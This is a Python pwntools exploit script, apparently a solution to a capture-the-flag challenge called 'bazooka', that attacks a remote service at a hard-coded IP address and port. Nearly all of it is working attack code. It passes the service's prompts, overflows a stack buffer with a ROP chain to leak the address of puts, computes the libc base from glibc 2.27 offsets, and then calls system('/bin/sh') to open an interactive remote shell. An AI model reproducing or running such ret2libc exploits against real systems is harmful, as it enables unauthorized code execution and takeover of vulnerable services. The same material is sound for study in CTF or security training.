from pwn import *
elf = ELF("/home/kali/Downloads/pwn_bazooka_bazooka")
p = elf.process()
p = remote('34.185.173.244', 30442)

#gdb.attach(p, gdbscript = "b * 0x400740")

helper = p64(0x400815)
l00p = p64(0x40079C)
pop_rdi_ret = p64(0x04008f3)



#l00p
p.recvuntil(b": ")
p.sendline(b"secrethere")

#fake-junk
p.recvuntil(b"junk: ")
p.sendline(b"junkhere")

#l00p
p.recvuntil(b": ")
p.sendline(b"#!@{try_hard3r}")

#vuln
p.recvuntil(b": ")
#bufoverflow -> ret to l00p
p.sendline(b"A"*112 + b'\x90'*8 + pop_rdi_ret + p64(elf.got['puts']) + p64(elf.plt['puts']) + l00p)

p.recvline()

leak = p.recv(6)
leaked = u64( leak.ljust(8, b'\x00'))

print(f"leak: {hex(leaked)}")

puts_offset = 0x585a0
#2.27
puts_offset = 0x80aa0
libc = leaked - puts_offset

print(f"libc: {hex(libc)}")

#binsh_offset = 0x17fea4
#2.27
binsh_offset = 0x1b3e1a
binsh = libc + binsh_offset

#system_offset = 0x2b110
#2.27
system_offset = 0x4f550
system = libc + system_offset

print(f"binsh: {hex(binsh)}")
print(f"system: {hex(system)}")

#l00p
p.recvuntil(b": ")
p.sendline(b"#!@{try_hard3r}")

ret = p64(0x0400596)

#vuln
p.recvuntil(b": ")
#bufoverflow -> ret to l00p
p.sendline(b"A"*112 + b'\x90'*8  +  pop_rdi_ret + p64(binsh) + ret   + p64(system))

p.interactive()
